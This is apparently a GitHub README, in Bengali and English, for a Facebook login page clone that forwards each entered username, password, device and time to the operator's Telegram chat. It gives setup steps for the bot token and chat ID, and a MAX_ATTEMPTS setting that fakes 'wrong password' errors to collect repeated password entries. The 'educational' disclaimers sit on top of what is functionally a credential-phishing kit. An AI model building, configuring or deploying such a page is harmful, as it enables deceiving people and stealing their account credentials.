# 🔐 Facebook Login UI Clone + Telegram Bot Integration

একটা **responsive Facebook login page clone** — **Tailwind CSS** দিয়ে বানানো, সাথে **Telegram Bot integration** যাতে login attempt details সরাসরি আপনার Telegram chat-এ চলে যায়।

> ⚠️ **শুধুমাত্র Educational Purpose** — এই project টা শেখার জন্য (frontend + API integration)। **অন্যের credentials collect করা সম্পূর্ণ illegal ও unethical**। নিজের testing ছাড়া আর কোথাও use করবেন না।

---

## 📸 Preview

| Login Screen | Wrong Password | Success Overlay |
|--------------|----------------|-----------------|
| Mobile-friendly card | Red error message | Spinner + redirect |

*(নিজের screenshot `/screenshots` folder-এ রেখে এখানে link দিন)*

---

## ✨ Features (কী কী আছে)

- 🎨 **Pixel-perfect Facebook UI** — Tailwind CSS + Inter font + Meta footer
- 📱 **Fully responsive** — Mobile-first, সব screen-এ কাজ করে
- 🔁 **Retry loop** — `MAX_ATTEMPTS` বার পর্যন্ত "wrong password" দেখায়
- 📤 **Telegram Bot API** — প্রতিটা login attempt পাঠায় (user, pass, device, time)
- ⏳ **Loading states** — Request চলাকালীন button disable + spinner
- 🧹 **Auto form reset** — প্রতিটা attempt-এর পর field খালি হয়
- 🎭 **Custom modal** — Native `alert()` নেই, smooth animation
- 🔒 **Zero dependencies** — শুধু Tailwind CDN, কোনো build step নেই

---

## 🚀 Quick Start (কীভাবে চালাবেন)

### 1️⃣ Repository clone করুন

```bash
git clone https://github.com/YOUR_USERNAME/fb-login-telegram.git
cd fb-login-telegram
```

### 2️⃣ Telegram Bot তৈরি করুন

1. Telegram-এ যান → search করুন **[@BotFather](https://t.me/BotFather)**
2. `/newbot` send করুন
3. একটা **name** আর **username** দিন
4. **Bot Token** copy করুন (দেখতে এমন: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

### 3️⃣ Chat ID বের করুন

1. আপনার নতুন bot-কে একটা message পাঠান
2. Browser-এ এই URL খুলুন:
   ```
   https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
   ```
3. `"chat":{"id":123456789}` খুঁজুন — **id** টা copy করুন

### 4️⃣ HTML configure করুন

`index.html` খুলে এই দুই লাইন edit করুন:

```javascript
const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // BotFather থেকে পাওয়া
const CHAT_ID   = "YOUR_CHAT_ID_HERE";     // আপনার telegram id
```

### 5️⃣ Local-এ চালান

`file://` protocol-এ Telegram API block হতে পারে, তাই local server ব্যবহার করুন:

```bash
# Python 3
python -m http.server 8000

# অথবা Node.js
npx serve
```

তারপর খুলুন: **http://localhost:8000**

---

## ⚙️ Configuration (কাস্টমাইজ)

| Variable | Description | Default |
|----------|-------------|---------|
| `BOT_TOKEN` | BotFather থেকে পাওয়া bot token | — |
| `CHAT_ID` | আপনার Telegram chat id | — |
| `MAX_ATTEMPTS` | Success-এর আগে কতবার "wrong password" দেখাবে | `3` |

### Attempts কাস্টমাইজ

```javascript
const MAX_ATTEMPTS = 3;      // ৩ বার error, তারপর success
const MAX_ATTEMPTS = 999;    // প্রায় infinite loop
const MAX_ATTEMPTS = 1;      // প্রথম try-তেই success
```

---

## 📂 Project Structure (ফোল্ডার স্ট্রাকচার)

```
fb-login-telegram/
│
├── index.html          # Complete single-file app (HTML + CSS + JS)
├── README.md           # এই ফাইল
└── screenshots/        # (optional) preview images
    ├── login.png
    ├── error.png
    └── success.png
```

---

## 🔄 How It Works (কীভাবে কাজ করে)

```
┌─────────────────┐
│  User fills     │
│  email + pass   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  Fetch POST to  │
│  Telegram API   │──────► 📱 আপনার Telegram chat
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ attemptCount++  │
└────────┬────────┘
         │
    ┌────┴─────┐
    │          │
    ▼          ▼
< MAX?      = MAX?
    │          │
    ▼          ▼
Error দেখাও  Success overlay
+ retry      + form reset
```

---

## 🛡️ Security Notice (নিরাপত্তা সতর্কতা)

| ⚠️ সমস্যা | কেন গুরুত্বপূর্ণ |
|---------|------------------|
| **Bot token HTML-এ visible** | Source দেখলেই যে কেউ চুরি করতে পারে। **কখনো publicly deploy করবেন না।** |
| **No HTTPS** | Telegram API শুধু HTTPS-এ কাজ করে — local server বা SSL hosting ব্যবহার করুন। |
| **No server-side validation** | সব browser-এ চলে। আসল login-এর জন্য backend দরকার। |
| **CORS** | Telegram API cross-origin allow করে, কিন্তু rate limit আছে। |

### 🔒 আসল project-এ **server-side proxy** ব্যবহার করুন:

```javascript
// Telegram-কে সরাসরি call না করে:
fetch('/api/telegram', {
  method: 'POST',
  body: JSON.stringify({ username, password })
});
```

আপনার backend (Node.js / PHP / Python) token টা নিরাপদে রাখবে।

---

## 🧪 Testing Checklist (টেস্ট করার লিস্ট)

- [ ] Enter key-তে form submit হয়
- [ ] Wrong password-এ লাল error message দেখায়
- [ ] প্রতিটা attempt-এ Telegram message পায়
- [ ] Request চলাকালীন button disable হয়
- [ ] `MAX_ATTEMPTS` শেষে success overlay আসে
- [ ] Success-এর পর form reset হয়
- [ ] Mobile-এ কাজ করে (iOS Safari, Android Chrome)

---

## 🤝 Contributing (কন্ট্রিবিউট করুন)

**UI improvements** আর **security hardening**-এর জন্য contribution স্বাগতম।

1. Repo fork করুন
2. Branch তৈরি করুন: `git checkout -b feature/my-feature`
3. Commit করুন: `git commit -m "Add my feature"`
4. Push করুন: `git push origin feature/my-feature`
5. Pull Request খুলুন

**Educational** nature টা ঠিক রাখবেন। যেসব PR credential theft সহজ করে, সেগুলো reject করা হবে।

---

## 📜 License

MIT License — বিস্তারিত [LICENSE](LICENSE) ফাইলে।

---

## ⚖️ Legal Disclaimer (আইনি সতর্কতা)

এই project টা **শুধুমাত্র educational purpose**-এ দেওয়া হয়েছে, যাতে শেখা যায়:
- Tailwind CSS দিয়ে frontend UI cloning
- REST API integration (Telegram Bot API)
- Client-side state management

**এই code দিয়ে কাউকে deceive করা, phish করা, বা কারো credentials collect করা সম্পূর্ণ illegal** — বেশিরভাগ দেশের computer fraud law-এর অধীনে (US-এর CFAA, UK-এর Computer Misuse Act, বাংলাদেশের ICT Act)।

Author **কোনো liability নেয় না** misuse-এর জন্য। শুধু নিজের account, নিজের শেখার জন্য ব্যবহার করুন।

---

## 🙏 Acknowledgements (কৃতজ্ঞতা)

- [Tailwind CSS](https://tailwindcss.com/) — utility-first CSS
- [Inter Font](https://fonts.google.com/specimen/Inter) — Rasmus Andersson
- [Telegram Bot API](https://core.telegram.org/bots/api) — official docs
- [BotFather](https://t.me/BotFather) — bot creation

---

## 📬 Contact (যোগাযোগ)

**Your Name** — [@your_twitter](https://twitter.com/your_twitter) — your@email.com

Project Link: [https://github.com/YOUR_USERNAME/fb-login-telegram](https://github.com/YOUR_USERNAME/fb-login-telegram)

---

<p align="center">
  <b>⭐ কিছু শিখলে repo-তে star দিন!</b><br>
  <i>শেখার জন্য বানানো, scam করার জন্য না।</i>
</p>
